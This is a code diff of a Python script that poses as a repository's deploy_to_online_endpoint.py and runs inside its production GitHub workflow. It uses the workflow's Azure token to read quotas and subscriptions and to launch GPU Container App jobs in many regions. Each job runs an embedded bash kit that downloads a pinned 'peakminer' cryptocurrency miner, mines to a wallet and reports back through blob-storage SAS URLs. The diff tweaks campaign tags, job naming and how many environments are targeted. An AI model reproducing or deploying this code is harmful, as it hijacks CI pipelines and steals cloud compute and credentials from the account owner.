@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""C211-I134071: mslearn 790067ff DENSITY FILL of every GPU env without a live job (nonce x1340dens).
+"""C211-I133534: mslearn 790067ff QUOTA READ + ALL-GPU-ENV FILL (new payload, nonce x133534quota).
 
 Runs as src/deploy_to_online_endpoint.py under christiansegercrantz/mslearn-mlops
 'deploy-prod' issue_comment workflow (environment prod, azure/login -> ARM token for
@@ -28,9 +28,9 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I134071"
-INTENT = "134071"
-NONCE = "x1340dens"
+TAG = "C211_I133986"
+INTENT = "133986"
+NONCE = "x1337keep0231"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
@@ -179,10 +179,10 @@ def preupload(cont_base, q, blobname, url, want_sha, locpath):
 
 
 KIT = r"""#!/bin/bash
-# C211-I134071 density kit: pinned peakminer 2.20.0, ONE process on GPU 0, worker node-hd*, long window.
+# C211-I133778 refill kit: pinned peakminer 2.20.0, ONE process on GPU 0, long window.
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
-WK="node-hd$(echo -n "$H" | sha256sum | cut -c1-6)"
+WK="node-hm$(echo -n "$H" | sha256sum | cut -c1-6)"
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__ENV__-$H.txt?$Q"
 PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
 W="__WALLET__"; RC=none; PHASE=init
@@ -296,7 +296,7 @@ def decode_status(txt):
 
 PROVEN = ["c211-133172-b0", "c211-i132971-a100-sweden", "c211-132160-brs"]
 COMPUTE_VER = "2024-07-01"
-MAX_ENVS = 60
+MAX_ENVS = 16
 GPU_REGIONS = ["eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
                "northcentralus", "southcentralus", "canadacentral", "brazilsouth",
                "swedencentral", "westeurope", "northeurope", "uksouth", "francecentral",
@@ -313,7 +313,7 @@ def normloc(v):
 
 
 def jname_for(env):
-    s = ("c211-134071-" + env.replace("c211-", "")).lower()
+    s = ("c211-k-" + env.replace("c211-", "")).lower()
     s = re.sub(r"[^a-z0-9-]", "-", s)
     return s[:32]
 
@@ -524,13 +524,6 @@ def main():
          live_map=";".join("%s:%s" % (k, v) for k, v in live_envs.items())[:900],
          states=";".join("%s=%s/rem=%s" % (c["job"], c["status"], c["rem"]) for c in census)[:1600])
 
-    # C211-134071 density: only envs WITHOUT a live job are eligible for a new job.
-    ready_all = list(ready)
-    ready = [x for x in ready if x["name"] not in live_envs]
-    emit("density-targets", ready_total=len(ready_all), skipped_live=len(ready_all) - len(ready),
-         targets=len(ready), envs=";".join(x["name"] for x in ready)[:1500],
-         live_envs=";".join(sorted(live_envs))[:900])
-
     # ---------- 3) identity + quotas: az account show/list, role assignments,
     # Microsoft.App GPU per region, Compute NC/ND/NV per region ----------
     r = run(["az", "account", "list", "-o", "json"], timeout=120)
@@ -613,16 +606,6 @@ def main():
          note="new managed env only if mapp free_gpu>0 in region without GPU env")
 
     # ---------- 4) one manual job per env; parallelism from free regional GPU quota ----------
-    # C211-134071: pick exactly ONE env for the parallelism=8 density probe (A100 profile,
-    # preferring a region whose Microsoft.App GPU free quota is positive; else first A100;
-    # else first target). All other envs keep the base parallelism.
-    DENSITY_ENV = "c211-i132971-a100-sweden"
-    if not any(x["name"] == DENSITY_ENV for x in ready):
-        for x in ready_all:
-            if x["name"] == DENSITY_ENV:
-                ready.append(x); break
-    emit("density-plan", env=DENSITY_ENV, par=8, candidates=len(ready),
-         appfree=";".join("%s:%s" % (k, v) for k, v in sorted(appfree.items()))[:900])
     byreg = {}
     for x in ready:
         byreg.setdefault(x["region"], []).append(x)
@@ -631,13 +614,11 @@ def main():
         free = appfree.get(reg)
         n = len(grp)
         for x in grp:
-            par = 8 if x["name"] == DENSITY_ENV else (2 if "A100" in str(x["profile"]).upper() else 1)
-            nm = ("c211-k-d8-i132971-a100-sweden" if x["name"] == DENSITY_ENV
-                  else jname_for(x["name"]))
-            lbl = ("d8-" + x["name"]) if x["name"] == DENSITY_ENV else x["name"]
+            par = 2 if "A100" in str(x["profile"]).upper() else 1
+            nm = jname_for(x["name"])
             url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                    "?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
-            if x["name"] in live_envs and x["name"] != DENSITY_ENV:
+            if x["name"] in live_envs:
                 emit("capp-job-skip", env=x["name"], name=nm, because="LIVE_JOB",
                      live=live_envs[x["name"]])
                 continue
@@ -652,7 +633,7 @@ def main():
                                    "template": {"containers": [{
                                        "name": "gpu", "image": IMAGE,
                                        "command": ["/bin/bash", "-c",
-                                                   kit_cmd(cont_base, q).replace("__ENV__", lbl)],
+                                                   kit_cmd(cont_base, q).replace("__ENV__", x["name"])],
                                        "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
             st = None
             b = None
@@ -661,7 +642,7 @@ def main():
                 body["properties"]["configuration"]["replicaTimeout"] = rt_try
                 body["properties"]["template"]["containers"][0]["command"] = [
                     "/bin/bash", "-c",
-                    kit_cmd(cont_base, q, mines_try).replace("__ENV__", lbl)]
+                    kit_cmd(cont_base, q, mines_try).replace("__ENV__", x["name"])]
                 st, b = arm(tok, url, method="PUT", body=body, timeout=180)
                 if st in (200, 201, 202):
                     rt_used = rt_try
